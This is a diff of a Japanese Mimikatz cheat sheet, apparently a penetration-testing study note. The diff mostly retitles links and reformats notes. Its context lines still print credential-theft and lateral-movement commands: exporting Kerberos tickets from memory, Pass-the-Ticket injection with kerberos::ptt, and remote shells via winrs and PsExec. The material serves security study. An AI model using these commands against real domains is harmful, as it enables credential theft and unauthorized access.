@@ -91,7 +91,7 @@ privilege::debug
 | ------------------ | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------ |
 | `kerberos::list`   | メモリ内の現在ユーザの Kerberos チケット（TGT、Service Ticket）の一覧表示およびエクスポート                    | `/export`（チケットをファイルへエクスポート）                                                          |
 | `kerberos::ptt`    | 指定した Kerberos チケットをインポートして Pass-the-Ticket を実行                                 | ・`/filename`（チケットファイルのパス、複数指定可）<br>・`/directory`（.kirbi ファイルが含まれるディレクトリパス、配下のすべてを挿入） |
-| `kerberos::golden` | 任意ユーザ／グループ向けに偽造の TGT または Service Ticket を作成（Golden Ticket / Silver Ticket の発行） | ・[🥝Mimikatz](#Golden%20Ticket)<br>・[🥝Mimikatz](#Silver%20Ticket)                                           |
+| `kerberos::golden` | 任意ユーザ／グループ向けに偽造の TGT または Service Ticket を作成（Golden Ticket / Silver Ticket の発行） | ・[Golden Ticket](#Golden%20Ticket)<br>・[Silver Ticket](#Silver%20Ticket)             |
 
 ---
 
@@ -143,7 +143,7 @@ sekurlsa::msv
 # 現在のKerberosチケットを .kirbi でエクスポート
 sekurlsa::tickets /export  
 ```
-- 補足：[用語](../Misc/用語.md#プロバイダー)
+- 補足：[プロバイダー](../Misc/用語.md#プロバイダー)
 
 ## レジストリからの抽出
 
@@ -250,7 +250,7 @@ klist
 
 - Pass the Ticket は、既存の正規の**TGS**を窃取し、アカウントのパスワードを使用することなく、認証を突破する攻撃手法
 	- TGTは作成されたユーザーセッションに紐づけられているため他システムでは再利用できないが、TGSはエクスポートして他のシステムでも再利用できる
-- 関連ノート：[ADの基本](../Cheatsheet/🪟Windows/Active%20Directory/ADの基本.md#チケットの形式)
+- 関連ノート：[チケットの形式](../Cheatsheet/🪟Windows/Active%20Directory/ADの基本.md#チケットの形式)
 
 ## PtT攻撃
 
@@ -259,8 +259,9 @@ klist
 sekurlsa::tickets /export
 ```
 - →すべての.kirbiチケットがカレントディレクトリにエクスポートされる
-- 🚨`Session Key:`がdesの場合、Windows 7以降では既定無効なので使えない([Removal of DES in Kerberos for Windows Server and Client - Microsoft](https://techcommunity.microsoft.com/blog/windowsservernewsandbestpractices/removal-of-des-in-kerberos-for-windows-server-and-client/4386903))
-- [🥝Mimikatz](#補足：チケットエクスポート時の出力の読み方)
+
+>[!Note]
+>`Session Key:`がdesの場合、Windows 7以降では既定無効なので使えない(🔗[Removal of DES in Kerberos for Windows Server and Client - Microsoft](https://techcommunity.microsoft.com/blog/windowsservernewsandbestpractices/removal-of-des-in-kerberos-for-windows-server-and-client/4386903))。
 
 2. 現在のLogon IDを確認する
 ```powershell
@@ -278,7 +279,9 @@ Cached Tickets: (0)
 ```powershell
 kerberos::ptt <xxx.kirbi>
 ```
-- 🚨「現在の自分のセッション」にチケットを注入するため、注入したチケットのLUIDと自分のLUIDが一致していないと、コマンド実行時にそのチケットが使われない（[ADの基本](../Cheatsheet/🪟Windows/Active%20Directory/ADの基本.md#チケットの形式)）
+
+>[!NOTE]
+>「現在の自分のセッション」にチケットを注入するため、注入したチケットのLUIDと自分のLUIDが一致していないと、コマンド実行時にそのチケットが使われない（[チケットの形式](../Cheatsheet/🪟Windows/Active%20Directory/ADの基本.md#チケットの形式)）
 
 　4. 成否確認
 ```powershell
@@ -303,10 +306,10 @@ klist
 misc::cmd
 
 # リバースシェルなど完全にインタラクティブでないとき
-winrs -r:<Target_FQDN> cmd.exe
+winrs -r:<target_FQDN> cmd.exe
 
 ## 代替
-.\PsExec64.exe -accepteula \\<Target_FQDN> cmd.exe
+.\PsExec64.exe -accepteula \\<target_FQDN> cmd.exe
 ```
 - Golden Ticketのときも上記コマンドで成否確認可能
 
